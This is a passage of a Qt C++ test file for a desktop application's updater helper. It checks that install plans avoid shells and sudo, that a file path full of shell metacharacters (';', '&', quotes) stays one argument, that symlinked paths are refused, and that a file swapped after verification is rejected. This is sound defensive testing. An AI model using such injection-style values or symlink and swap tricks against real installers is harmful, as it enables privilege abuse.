        planWindowsSetup(args),
        planLinuxDeb(args, everything),
        planLinuxRpm(args, everything),
    };
    for (const StrategyResult &result : plans) {
        QVERIFY(result.ok());
        for (const QString &argument : result.plan.arguments) {
            QVERIFY2(!argument.startsWith(QStringLiteral("--force")),
                     qPrintable(argument));
            QVERIFY2(argument != QStringLiteral("--nodeps"), qPrintable(argument));
            QVERIFY2(argument != QStringLiteral("-f"), qPrintable(argument));
            QVERIFY2(!argument.contains(QStringLiteral("sudo")), qPrintable(argument));
            QVERIFY2(argument != QStringLiteral("-c"), qPrintable(argument));
        }
        QVERIFY(!result.plan.program.endsWith(QStringLiteral("/sh")));
        QVERIFY(!result.plan.program.endsWith(QStringLiteral("/bash")));
        QVERIFY(!result.plan.program.endsWith(QStringLiteral("cmd.exe")));
        QVERIFY(!result.plan.program.contains(QStringLiteral("sudo")));
    }
}

void UpdaterHelperArgsTest::awkwardPathSurvivesAsASingleArgvElement()
{
    // Spaces, parentheses, quotes, an ampersand, a semicolon, non-ASCII, and
    // a Lithuanian ogonek. Because a plan is an argument VECTOR, none of this
    // needs escaping — and it must arrive unmodified as ONE element.
    const QString awkward = QStringLiteral(
        "/staging/Lightning (naujas) 0.8.0 — ąčęėįšųūž & 'quoted' \"x\"; ok.deb");

    UpdaterArguments args;
    args.artifactPath = awkward;
    const auto everything = [](const QString &) { return true; };

    const StrategyResult deb = planLinuxDeb(args, everything);
    QVERIFY(deb.ok());
    QCOMPARE(deb.plan.arguments.last(), awkward);
    QCOMPARE(deb.plan.arguments.count(awkward), 1);

    const StrategyResult rpm = planLinuxRpm(args, everything);
    QVERIFY(rpm.ok());
    QCOMPARE(rpm.plan.arguments.last(), awkward);

    // The Windows plans convert separators for msiexec's parser, so the
    // expectation is the same string with '\' — what must NOT change is that
    // it is still ONE argv element, quotes, spaces and all.
    QString awkwardWindows = awkward;
    awkwardWindows.replace(QLatin1Char('/'), QLatin1Char('\\'));

    const StrategyResult msi = planWindowsMsi(args);
    QVERIFY(msi.ok());
    QCOMPARE(msi.plan.arguments.at(1), awkwardWindows);
    QCOMPARE(msi.plan.arguments.count(awkwardWindows), 1);

    const StrategyResult setup = planWindowsSetup(args);
    QVERIFY(setup.ok());
    QCOMPARE(setup.plan.program, awkwardWindows);

    // And nothing anywhere concatenated it into a command line.
    for (const QString &argument : deb.plan.arguments)
        QVERIFY(!argument.contains(QStringLiteral("install -y")));
}

void UpdaterHelperArgsTest::planForModeRefusesEcosystemManagedTypes_data()
{
    QTest::addColumn<int>("mode");
    QTest::addColumn<int>("expected");
    QTest::newRow("flatpak") << int(UpdaterMode::LinuxFlatpak)
                             << int(StrategyError::NotSelfInstallable);
    QTest::newRow("snap") << int(UpdaterMode::LinuxSnap)
                          << int(StrategyError::NotSelfInstallable);
    QTest::newRow("development") << int(UpdaterMode::Development)
                                 << int(StrategyError::NotSelfInstallable);
    QTest::newRow("unknown") << int(UpdaterMode::UnknownInstall)
                             << int(StrategyError::NotSelfInstallable);
    QTest::newRow("invalid") << int(UpdaterMode::Invalid)
                             << int(StrategyError::NotSelfInstallable);
    QTest::newRow("dmg") << int(UpdaterMode::MacosDmg)
                         << int(StrategyError::UnsupportedPlatform);
}

void UpdaterHelperArgsTest::planForModeRefusesEcosystemManagedTypes()
{
    QFETCH(int, mode);
    QFETCH(int, expected);

    UpdaterArguments args;
    args.mode = static_cast<UpdaterMode>(mode);
    args.artifactPath = QStringLiteral("/staging/whatever");

    const StrategyResult result = planForMode(args);
    QVERIFY(!result.ok());
    QCOMPARE(int(result.error), expected);
    QVERIFY(result.plan.program.isEmpty());
    QVERIFY(result.plan.arguments.isEmpty());
}


// ---------------------------------------------------------------------------
// The digest contract. The helper is connected to the application's verified
// download by nothing but a path that can sit armed for hours, so it takes
// the signed manifest's SHA-256 on its argv and re-hashes the file itself
// right before acting (ArtifactDigest.h).
// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::digestMustBeSixtyFourLowercaseHex_data()
{
    QTest::addColumn<QString>("value");
    QTest::addColumn<bool>("accepted");
    const QString good = QString(64, QLatin1Char('a'));
    QTest::newRow("valid") << good << true;
    QTest::newRow("too short") << good.left(63) << false;
    QTest::newRow("too long") << good + QLatin1Char('a') << false;
    QTest::newRow("upper case") << good.toUpper() << false;
    QTest::newRow("not hex") << QString(64, QLatin1Char('g')) << false;
    QTest::newRow("0x prefix") << QStringLiteral("0x") + good.left(62) << false;
}

void UpdaterHelperArgsTest::digestMustBeSixtyFourLowercaseHex()
{
    QFETCH(QString, value);
    QFETCH(bool, accepted);
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args[args.indexOf(QStringLiteral("--sha256")) + 1] = value;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QCOMPARE(parsed.ok(), accepted);
    if (!accepted) {
        QCOMPARE(parsed.error, ArgsError::InvalidDigest);
        QCOMPARE(parsed.offendingOption, QStringLiteral("--sha256"));
    } else {
        QCOMPARE(parsed.args.expectedSha256, value);
    }
}

void UpdaterHelperArgsTest::artifactTargetAndRelaunchMustNotBeSymlinks()
{
#ifdef Q_OS_WIN
    QSKIP("symlink creation requires elevation on Windows");
#else
    const QDir root(m_dir.path());
    // Every path option, one at a time: a link to a perfectly valid file
    // is refused on its own merits, because exists()/isFile() follow it and
    // the strategies would chmod, replace, or hand to root whatever it
    // pointed at when they ran.
    struct Case { const char *option; QString linkTo; QString mode; QString target; };
    const QList<Case> cases = {
        { "--artifact", m_artifact, QStringLiteral("linux-deb"), m_targetDir },
        { "--target", m_targetFile, QStringLiteral("linux-appimage"), m_targetFile },
        { "--relaunch", m_relaunch, QStringLiteral("linux-deb"), m_targetDir },
    };
    for (const Case &c : cases) {
        const QString link = root.absoluteFilePath(
            QStringLiteral("link-") + QString::fromLatin1(c.option).mid(2));
        QFile::remove(link);
        QVERIFY(QFile::link(c.linkTo, link));
        QStringList args = baseArgs(c.mode, c.target);
        args[args.indexOf(QString::fromLatin1(c.option)) + 1] = link;
        const ArgsParseResult parsed = parseUpdaterArgs(args);
        QVERIFY2(!parsed.ok(), c.option);
        QCOMPARE(parsed.error, ArgsError::PathIsSymlink);
        QCOMPARE(parsed.offendingOption, QString::fromLatin1(c.option));
        QFile::remove(link);
    }
#endif
}

void UpdaterHelperArgsTest::fileDigestMatchesQCryptographicHash()
{
    // Larger than one read chunk, so the streaming path is what is measured.
    QByteArray bytes(3 * 1024 * 1024 + 17, 'x');
    for (int i = 0; i < bytes.size(); i += 4099)
        bytes[i] = static_cast<char>(i & 0xff);
    const QString path = writeFile(
        QDir(m_dir.path()).absoluteFilePath(QStringLiteral("big.bin")), bytes);
    QVERIFY(!path.isEmpty());
    const QString expected = QString::fromLatin1(
        QCryptographicHash::hash(bytes, QCryptographicHash::Sha256).toHex());
    QCOMPARE(sha256HexOfFile(path), expected);
    QVERIFY(isSha256Hex(expected));
    // Unreadable is EMPTY, never a digest of nothing.
    QVERIFY(sha256HexOfFile(QDir(m_dir.path()).absoluteFilePath(
                QStringLiteral("absent.bin"))).isEmpty());
}

namespace {

#ifndef Q_OS_WIN
// A pid that has certainly exited, so the helper's wait returns at once.
qint64 exitedPid()
{
    // A child that blocks on stdin until we close it, so the pid can be read
    // while it is certainly alive and then certainly exited.
    QProcess probe;
    probe.start(QStringLiteral("/bin/sh"), {QStringLiteral("-c"), QStringLiteral("read x")});
    if (!probe.waitForStarted(5000))
        return 0;
    const qint64 pid = probe.processId();
    probe.closeWriteChannel();
    if (!probe.waitForFinished(5000))
        return 0;
    return pid;
}

QJsonObject readStatus(const QString &path)
{
    QFile file(path);
    if (!file.open(QIODevice::ReadOnly))
        return {};
    return QJsonDocument::fromJson(file.readAll()).object();
}
#endif

} // namespace

void UpdaterHelperArgsTest::theHelperRefusesAnArtifactWhoseDigestChanged()
{
#ifdef Q_OS_WIN
    QSKIP("the end-to-end helper run uses /bin/true for an exited pid");
#else
    const QString helper = QStringLiteral(LIGHTNING_UPDATER_HELPER_PATH);
    QVERIFY2(QFileInfo(helper).isExecutable(), qPrintable(helper));
    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QDir root(dir.path());
    const QString artifact = writeFile(root.absoluteFilePath(QStringLiteral("new.AppImage")),
                                       QByteArray("verified bytes"));
    const QString target = writeFile(root.absoluteFilePath(QStringLiteral("Lightning.AppImage")),
                                     QByteArray("installed bytes"));
    const QString status = root.absoluteFilePath(QStringLiteral("status.json"));
    const QString verifiedDigest = sha256HexOfFile(artifact);
    const qint64 pid = exitedPid();
    QVERIFY(pid > 1);

    // The swap: between "verified" and "installed" somebody replaced the
    // file. The digest on argv is the one the manifest signed.
    QVERIFY(!writeFile(artifact, QByteArray("attacker bytes")).isEmpty());

    QProcess run;
    run.start(helper, {QStringLiteral("--mode"), QStringLiteral("linux-appimage"),
                       QStringLiteral("--artifact"), artifact,
                       QStringLiteral("--pid"), QString::number(pid),
                       QStringLiteral("--target"), target,
                       QStringLiteral("--status"), status,
                       QStringLiteral("--sha256"), verifiedDigest});
    QVERIFY(run.waitForStarted(5000));
    QVERIFY(run.waitForFinished(30000));
    QCOMPARE(run.exitCode(), 10); // ExitArtifactDigestMismatch

    // Nothing was touched, and the refusal is on record for the next launch.
    QFile installed(target);
    QVERIFY(installed.open(QIODevice::ReadOnly));
    QCOMPARE(installed.readAll(), QByteArray("installed bytes"));
    const QJsonObject report = readStatus(status);
    QCOMPARE(report.value(QStringLiteral("ok")).toBool(true), false);
    QCOMPARE(report.value(QStringLiteral("error")).toString(),
             QStringLiteral("artifact-digest-mismatch"));
    QCOMPARE(report.value(QStringLiteral("mode")).toString(),
             QStringLiteral("linux-appimage"));
#endif
}

void UpdaterHelperArgsTest::theHelperInstallsWhenTheDigestMatches()
{
#ifdef Q_OS_WIN
    QSKIP("the end-to-end helper run uses /bin/true for an exited pid");
#else
    const QString helper = QStringLiteral(LIGHTNING_UPDATER_HELPER_PATH);
    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QDir root(dir.path());
    const QString artifact = writeFile(root.absoluteFilePath(QStringLiteral("new.AppImage")),
                                       QByteArray("verified bytes"));
    const QString target = writeFile(root.absoluteFilePath(QStringLiteral("Lightning.AppImage")),
                                     QByteArray("installed bytes"));
    const QString status = root.absoluteFilePath(QStringLiteral("status.json"));
    const qint64 pid = exitedPid();
    QVERIFY(pid > 1);

    QProcess run;
    run.start(helper, {QStringLiteral("--mode"), QStringLiteral("linux-appimage"),
                       QStringLiteral("--artifact"), artifact,
                       QStringLiteral("--pid"), QString::number(pid),
                       QStringLiteral("--target"), target,
                       QStringLiteral("--status"), status,
                       QStringLiteral("--sha256"), sha256HexOfFile(artifact)});
    QVERIFY(run.waitForStarted(5000));
    QVERIFY(run.waitForFinished(30000));
    QCOMPARE(run.exitCode(), 0);

    QFile installed(target);
    QVERIFY(installed.open(QIODevice::ReadOnly));
    QCOMPARE(installed.readAll(), QByteArray("verified bytes"));
    QVERIFY(QFileInfo(target).isExecutable());
    QCOMPARE(readStatus(status).value(QStringLiteral("ok")).toBool(false), true);
#endif
}

QTEST_GUILESS_MAIN(UpdaterHelperArgsTest)
#include "UpdaterHelperArgsTest.moc"
